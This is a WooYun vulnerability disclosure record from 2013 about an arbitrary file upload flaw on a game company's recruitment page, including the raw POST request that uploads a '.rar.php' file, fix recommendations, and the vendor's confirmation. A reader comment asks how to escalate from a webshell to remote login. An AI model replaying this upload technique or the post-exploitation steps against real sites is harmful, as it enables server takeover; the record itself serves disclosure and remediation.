{"id": 6294, "wybug_id": "wooyun-2013-046352", "wybug_title": "心动游戏主站getshell导致BBS等多个站点沦陷", "wybug_corp": "心动游戏", "wybug_author": "loli", "wybug_date": "2013-12-18 14:36", "wybug_open_date": "2014-02-01 14:37", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-12-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-01-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-01-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-02-01：\t细节向公众公开  简要描述： 心动游戏主站getshell导致多个站点沦陷 详细说明：  看到有个招聘的地方。http://www.xd.com/zhaopin?id=449&category=%E6%8A%80%E6%9C%AF%E7%A0%94%E5%8F%91%E7%B1%BB&title=PHP%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E5%B7%A5%E7%A8%8B%E5%B8%88附近上传未进行过滤导致存在任意文件上传：\n\n\nPOST /zhaopin/uploadWorks HTTP/1.1Host: www.xd.comProxy-Connection: keep-aliveContent-Length: 1448Origin: http://www.xd.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.69 Safari/537.36Content-Type: multipart/form-data; boundary=----------ae0ae0GI3ei4Ef1GI3KM7GI3cH2ae0Accept: */*Referer: http://www.xd.com/zhaopin?id=449&category=%E6%8A%80%E6%9C%AF%E7%A0%94%E5%8F%91%E7%B1%BB&title=PHP%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91%E5%B7%A5%E7%A8%8B%E5%B8%88Accept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: B2=2; A1=u1828nmshnarl6fm72fo3n3ma4; A2=dda6aaf7683e9ad4db53bda2bff5c71fff7178d0; pgv_pvi=5594397696; pgv_si=s1264425984; __utma=122500034.1493841397.1387344344.1387346969.1387347111.4; __utmb=122500034.3.10.1387347111; __utmc=122500034; __utmz=122500034.1387347111.4.4.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)------------ae0ae0GI3ei4Ef1GI3KM7GI3cH2ae0Content-Disposition: form-data; name=\"Filename\"111.rar.php------------ae0ae0GI3ei4Ef1GI3KM7GI3cH2ae0Content-Disposition: form-data; name=\"folder\"/------------ae0ae0GI3ei4Ef1GI3KM7GI3cH2ae0Content-Disposition: form-data; name=\"fileext\"*.rar;*.zip;------------ae0ae0GI3ei4Ef1GI3KM7GI3cH2ae0Content-Disposition: form-data; name=\"Filedata\"; filename=\"111.rar\"Content-Type: application/octet-streamÿØÿà\n程序直接获取Filename值，且文件及文件名未进行重命名，导致直接上传php格式\n\n   漏洞证明：  \n\n\n\n   修复方案：  1.对文件上传进行严格过滤，判断格式类型及图片完整性；2.重命名用户上传的文件及附件；3.针对用户上传目录如upload目录设置不解析php脚本权限；4.本人测试时上传的文件已删除，请管理员清查；声明：点到为止，本人未连接查看及下载数据库等操作。   版权声明：转载请注明来源 loli@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2013-12-18 14:40 厂商回复： 谢谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-13 23:08 |    \t\t橘子 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:3        | 呢个...羞射高中生一枚。带上大神@Haswell...)\t\t \n  请问...菜刀连上之后要怎么才能远程（ssh或者mstsc之类的）QAQ    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}